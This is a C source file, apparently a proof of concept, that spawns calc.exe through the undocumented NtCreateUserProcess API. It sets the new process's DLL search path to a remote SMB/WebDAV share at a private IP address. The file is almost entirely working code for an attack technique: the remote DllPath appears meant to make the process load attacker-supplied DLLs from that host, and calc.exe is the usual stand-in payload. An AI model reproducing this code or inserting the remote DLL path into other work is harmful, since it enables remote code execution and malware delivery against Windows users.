
#include <Windows.h>
#include "ntdll.h"
#pragma comment(lib, "ntdll")


// https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp


int main(int argc, char** argv)
{

	/*
	if (argc != 2) {

	}
	*/


	// Initialize Process Parameters
	UNICODE_STRING ImagePathName, DllPath, CurrentDirectory, CommandLine;

	RtlInitUnicodeString(&CommandLine, (PWSTR)L"C:\\Windows\\System32\\calc.exe");
	RtlInitUnicodeString(&DllPath, (PWSTR)L"\\\\192.168.200.3\\share\\"); // smb, webdav


	RtlInitUnicodeString(&ImagePathName, (PWSTR)L"C:\\Windows\\System32");
	RtlInitUnicodeString(&CurrentDirectory, (PWSTR)L"C:\\Windows\\System32");


	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &ImagePathName, &DllPath, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);



	UNICODE_STRING NtImagePath;
	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\calc.exe");


	// Initialize the PS_CREATE_INFO structure
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	// Initialize the PS_ATTRIBUTE_LIST structure
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtImagePath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

	// Create the process
	HANDLE hProcess, hThread = NULL;
	NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);


}


